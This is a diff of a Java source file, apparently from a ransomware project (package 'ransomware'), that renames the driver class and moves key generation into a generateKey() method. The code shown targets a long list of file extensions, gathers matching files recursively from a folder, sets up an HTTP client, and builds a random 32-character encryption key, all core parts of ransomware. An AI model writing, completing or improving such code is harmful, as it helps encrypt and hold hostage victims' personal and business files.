@@ -9,7 +9,7 @@ import org.apache.commons.io.FileUtils;
 
 import ransomware.exceptions.CryptoException;
 
-public class UtilsDriver {
+public class Driver {
     private static String key = "";
     private static String[] extensions = { "png", "jpg", "jpeg", "gif", "pdf", "mp4", "mp3", "mid", "cda", "txt", "zip",
             "7z", "pkg", "tar", "tar.gz", "rar", "z", "json", "js", "html", "log", "sav", "xml", "docx", "bat", "py",
@@ -20,16 +20,9 @@ public class UtilsDriver {
 
     public static void main(String[] args) throws Exception {
         HTTPClient Client = new HTTPClient();
-
-        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";
-
-        for (int i = 0; i < 32; i++) {
-            key += Character.toString(alphabet.charAt((int) (Math.random() * alphabet.length())));
-        }
-
-        System.out.println(key);
-
         File folder = new File(folderPath);
+        String key = generateKey();
+        System.out.println(key);
 
         Collection<File> fileArray = FileUtils.listFiles(folder, extensions, true);
         fileArray.stream().forEach(t -> {
@@ -96,5 +89,16 @@ public class UtilsDriver {
             System.out.println(ex.getMessage());
             ex.printStackTrace();
         }
+    }
+
+    public static String generateKey() {
+        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";
+        String key = "";
+
+        for (int i = 0; i < 32; i++) {
+            key += Character.toString(alphabet.charAt((int) (Math.random() * alphabet.length())));
+        }
+
+        return key;
     }
 }
